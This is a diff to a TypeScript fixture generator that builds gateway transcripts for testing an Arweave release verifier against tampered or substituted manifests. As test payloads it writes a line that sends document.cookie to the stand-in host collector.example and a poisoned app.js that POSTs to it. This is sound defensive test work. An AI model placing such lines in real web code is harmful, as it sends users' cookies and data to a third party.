@@ -38,6 +38,20 @@ const RELEASE_JSON_TXID = 'R'.repeat(43);
  * serving *wrong* bytes fails the byte comparison for a different reason.
  */
 const IMPOSTOR_MANIFEST_TXID = 'N'.repeat(43);
+/**
+ * `M′` — the manifest 12 §1.2's second pass produces, and the address the ArNS name is
+ * repointed to.
+ *
+ * It is a different transaction from `M` by construction: it references one more thing, the
+ * `release.json` sibling. Users load *this* one, so a corpus that carried only `M` could not
+ * ask the question 12 §1.2 requires the CLI to answer — whether the manifest the name serves
+ * contains the tree the release signed **and** the document its signatures are over.
+ */
+const FINAL_MANIFEST_TXID = 'F'.repeat(43);
+/** A release.json sibling nobody signed, for the substitution case below. */
+const SUBSTITUTE_RELEASE_JSON_TXID = 'X'.repeat(43);
+/** The path 12 §1.2's second pass adds. Written once, read by every M′ fixture. */
+const RELEASE_JSON_PATH = 'release.json';
 const GATEWAYS = [
   { name: 'alpha', rawUrl: 'https://alpha.example/raw/{txid}', txUrl: 'https://alpha.example/{txid}/{path}' },
   { name: 'beta', rawUrl: 'https://beta.example/raw/{txid}', txUrl: 'https://beta.example/{txid}/{path}' },
@@ -129,13 +143,22 @@ interface Tamper {
  * values are placeholders nothing resolves: this fixture asserts what a manifest *contains*,
  * never what a gateway does with it, which is the open `[VERIFY]` FE-P7 still holds.
  */
-function pathManifest(paths: readonly string[]): unknown {
+function pathManifest(
+  paths: readonly string[],
+  options: { readonly ids?: Readonly<Record<string, string>>; readonly prefix?: string } = {},
+): unknown {
+  const prefix = options.prefix ?? 'PATH';
   return {
     manifest: 'arweave/paths',
     version: '0.2.0',
     index: { path: 'index.html' },
     paths: Object.fromEntries(
-      [...paths].sort().map((path, index) => [path, { id: `PATH${String(index)}`.padEnd(43, 'z') }]),
+      [...paths]
+        .sort()
+        .map((path, index) => [
+          path,
+          { id: options.ids?.[path] ?? `${prefix}${String(index)}`.padEnd(43, 'z') },
+        ]),
     ),
   };
 }
@@ -162,6 +185,18 @@ function transcript(tamper: Tamper | undefined): unknown {
   for (const gateway of GATEWAYS) {
     put(gateway.rawUrl.replace('{txid}', RELEASE_JSON_TXID), releaseJsonBytes);
     put(gateway.rawUrl.replace('{txid}', MANIFEST_TXID), jsonBytes(pathManifest(Object.keys(files))));
+    // `M′`, honest in every scenario of this family: the tampering here is of the asset tree,
+    // and a second altered tree would make each of those findings ambiguous about which
+    // manifest produced it.
+    put(
+      gateway.rawUrl.replace('{txid}', FINAL_MANIFEST_TXID),
+      jsonBytes(
+        pathManifest([...Object.keys(files), RELEASE_JSON_PATH], {
+          ids: { [RELEASE_JSON_PATH]: RELEASE_JSON_TXID },
+          prefix: 'FILE',
+        }),
+      ),
+    );
     for (const [txid, text] of Object.entries(credentials)) {
       put(gateway.rawUrl.replace('{txid}', txid), utf8(text));
     }
@@ -169,7 +204,12 @@ function transcript(tamper: Tamper | undefined): unknown {
       const url = gateway.txUrl.replace('{txid}', MANIFEST_TXID).replace('{path}', path);
       const hit = tamper && tamper.gateway === gateway.name && tamper.path === path;
       put(url, hit && tamper.body ? tamper.body : bytes, hit ? (tamper.status ?? 200) : 200);
+      put(gateway.txUrl.replace('{txid}', FINAL_MANIFEST_TXID).replace('{path}', path), bytes);
     }
+    put(
+      gateway.txUrl.replace('{txid}', FINAL_MANIFEST_TXID).replace('{path}', RELEASE_JSON_PATH),
+      releaseJsonBytes,
+    );
   }
   return { schema: 'bleavit.gateway-transcript.v1', gateways: GATEWAYS, responses };
 }
@@ -238,8 +278,27 @@ interface ExtraPayload {
   readonly body: Uint8Array;
 }
 
-function cliTranscript(extra: ExtraPayload | undefined): unknown {
+/**
+ * How this transcript's `M′` departs from the honest one — 12 §1.2.
+ *
+ * Each field is one way the *repointed* manifest can be wrong while `M` is impeccable, which
+ * is the shape no fixture in this corpus could previously express: the pinned asset manifest
+ * is what `release.json` authorizes, and `M′` is what the name actually serves.
+ */
+interface FinalManifestVariant {
+  /** What `M′` resolves `release.json` to, when it is not the signed sibling. */
+  readonly releaseJsonTxid?: string;
+  /** `M′` lists and serves no `release.json` at all. */
+  readonly omitReleaseJson?: boolean;
+  /** `M′` serves altered bytes at one path; `M` serves the signed ones. */
+  readonly poison?: { readonly path: string; readonly body: Uint8Array };
+}
+
+function cliTranscript(
+  variant: { readonly extra?: ExtraPayload; readonly final?: FinalManifestVariant } = {},
+): unknown {
   const { responses, put } = recorder();
+  const { extra, final = {} } = variant;
   const raw = (gateway: (typeof GATEWAYS)[number], txid: string): string =>
     gateway.rawUrl.replace('{txid}', txid);
   const tx = (gateway: (typeof GATEWAYS)[number], txid: string, path: string): string =>
@@ -256,9 +315,34 @@ function cliTranscript(extra: ExtraPayload | undefined): unknown {
     // matches. Only the address is wrong.
     put(raw(gateway, IMPOSTOR_MANIFEST_TXID), jsonBytes(pathManifest(listed)));
 
+    // `M′` = `M` plus the `release.json` sibling. Its per-path ids are deliberately **not**
+    // the ones `M` carries: 12 §1.2's second pass re-uploads the tree, and whether an
+    // uploader mints new data items for identical bytes is inside FE-P7's open `[VERIFY]`.
+    // A fixture whose two manifests shared ids would let a checker compare them and pass,
+    // which would be an assumption about the uploader wearing a green test.
+    const finalListed = final.omitReleaseJson ? listed : [...listed, RELEASE_JSON_PATH];
+    put(
+      raw(gateway, FINAL_MANIFEST_TXID),
+      jsonBytes(
+        pathManifest(finalListed, {
+          ids: final.omitReleaseJson
+            ? {}
+            : { [RELEASE_JSON_PATH]: final.releaseJsonTxid ?? RELEASE_JSON_TXID },
+          prefix: 'FILE',
+        }),
+      ),
+    );
+
     for (const [path, bytes] of Object.entries(files)) {
       put(tx(gateway, MANIFEST_TXID, path), bytes);
       put(tx(gateway, IMPOSTOR_MANIFEST_TXID, path), bytes);
+      put(tx(gateway, FINAL_MANIFEST_TXID, path), final.poison?.path === path ? final.poison.body : bytes);
+    }
+    if (!final.omitReleaseJson) put(tx(gateway, FINAL_MANIFEST_TXID, RELEASE_JSON_PATH), producerBytes);
+    if (final.releaseJsonTxid !== undefined) {
+      // The substituted sibling resolves, and its bytes are the signed document's. Only its
+      // address differs — which is the case a byte comparison structurally cannot report.
+      put(raw(gateway, final.releaseJsonTxid), producerBytes);
     }
     if (extra && extra.gateway === gateway.name) put(tx(gateway, MANIFEST_TXID, extra.path), extra.body);
   }
@@ -305,18 +389,51 @@ write('registry.json', registry);
 write('keyring.json', keyring);
 writeFileSync(join(OUT, 'release.json'), Buffer.from(releaseJsonBytes));
 
-write('cli-honest.json', cliTranscript(undefined));
+write('cli-honest.json', cliTranscript());
 // A gateway serving one file nobody signed, listed in its own copy of the manifest and
 // present in what it hands over. Nothing the release pins is missing or altered, which is
 // exactly why a fetch loop driven by the signed map reports this tree clean.
 write(
   'cli-extra-payload.json',
   cliTranscript({
-    gateway: 'beta',
-    path: 'assets/tracker.js',
-    body: utf8('navigator.sendBeacon("https://collector.example", document.cookie);\n'),
+    extra: {
+      gateway: 'beta',
+      path: 'assets/tracker.js',
+      body: utf8('navigator.sendBeacon("https://collector.example", document.cookie);\n'),
+    },
   }),
 );
+
+// ---------------------------------------------------------------------------------------
+// The three ways `M′` can be wrong while `M` is impeccable — 12 §1.2.
+//
+// `release.json` pins `M`, the ArNS name serves `M′`, and a verifier that checks only the
+// pinned one verifies a tree nobody loads. Every transcript below serves the signed bytes at
+// every path of `M`, so a run that stops at the pinned address prints MATCH for each of them.
+// ---------------------------------------------------------------------------------------
+
+// The repointed manifest serves a payload where the release signed application code.
+write(
+  'cli-final-poisoned.json',
+  cliTranscript({
+    final: {
+      poison: {
+        path: 'assets/app.js',
+        body: utf8('export const boot = () => fetch("https://collector.example", {method:"POST"});\n'),
+      },
+    },
+  }),
+);
+// The repointed manifest resolves `release.json` to a sibling nobody signed. Its bytes are
+// the signed document's today, and 12 §1.2 makes the address the binding for exactly that
+// reason: two transactions with equal bytes now are two objects tomorrow.
+write(
+  'cli-final-substituted.json',
+  cliTranscript({ final: { releaseJsonTxid: SUBSTITUTE_RELEASE_JSON_TXID } }),
+);
+// The repointed manifest contains no `release.json`, so the release names a manifest that
+// does not contain it — the failure 12 §1.2's second pass exists to prevent.
+write('cli-final-omits-release-json.json', cliTranscript({ final: { omitReleaseJson: true } }));
 writeFileSync(join(OUT, 'cli-release.json'), Buffer.from(producerBytes));
 
 // The `--local dist/` side of 12 §1.3's command: the tree a third party built, written here
